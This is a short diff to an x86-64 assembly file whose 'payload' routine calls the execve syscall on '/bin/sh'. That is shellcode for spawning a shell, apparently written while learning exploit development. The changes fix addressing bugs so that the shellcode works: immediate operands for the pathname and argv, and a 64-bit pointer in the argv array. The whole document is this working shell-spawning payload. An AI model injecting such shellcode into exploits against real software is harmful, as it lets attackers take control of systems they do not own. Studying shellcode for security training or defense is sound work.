@@ -9,8 +9,6 @@
 #define ARGV    (STRLEN+1)
 #define ENVP    (ARGV+8)
 
-#define FILETORUN 0x400518
-
 .globl main
         .type   main, @function
 
@@ -19,7 +17,7 @@ main:
 
 payload:
 
-        movq    file_to_run, %rcx
+        movq    $file_to_run, %rcx
         //movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         xorq    %rax, %rax                 /* get a 64-bit zero value */
@@ -27,7 +25,7 @@ payload:
 
         movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        movq    argv, %rsi            /* syscall arg 2: argv */
+        movq    $argv, %rsi            /* syscall arg 2: argv */
         movq    $0, %rdx                 /* syscall arg 3: envp */
         syscall                          /* invoke syscall */
 
@@ -38,7 +36,7 @@ payload:
 file_to_run:
         .ascii  "/bin/sh\0"
 argv:
-        .long   file_to_run
+        .quad   file_to_run
         .quad   0x0
         .quad   0x0
 
